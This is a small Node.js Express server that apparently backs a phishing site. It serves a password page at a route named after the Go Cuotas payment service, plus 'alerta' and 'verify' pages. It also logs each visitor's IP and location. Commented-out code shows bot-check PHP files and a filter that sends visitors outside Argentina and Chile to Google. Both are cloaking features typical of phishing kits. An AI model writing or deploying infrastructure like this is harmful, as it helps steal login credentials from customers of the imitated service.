const express = require('express');
const path = require('path');
const php = require("node-php");
const geoip = require('geoip-lite');

const app = express();

app.use(express.static(path.join(__dirname, 'dist')));

// Configurar el middleware para ejecutar archivos PHP
// app.use("/cons.php", php.cgi("./dist/cons.php"));
// app.use("/botid.php", php.cgi("./dist/botid.php"));
// app.use("/app.php", php.cgi("./dist/app.php"));



app.use((req, res, next) => {
  const ip = req.headers['x-forwarded-for'] || req.ip; 
  const geo = geoip.lookup(ip);
  console.log(ip, geo);
  
  // Verifica si la ubicación del usuario no es Argentina ni Chile
  // if (!(geo && ['AR', 'CL'].includes(geo.country))) {
  //   // Redirige al usuario a otra página o sitio web
  //   return res.redirect('https://www.google.com/');
  // }


  next();
});

app.get('/api/ip', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.ip;
  res.json({ ip });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.get('/ingreso-go-cuotas', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'passlog.html'));
});

app.get('/alerta', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'alerta.html'));
});

app.get('/verify', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'verify.html'));
});


const port = process.env.PORT || 3001;

app.listen(port, () => {
  console.log(`Servidor escuchando en el puerto http://localhost:${port}`);
});
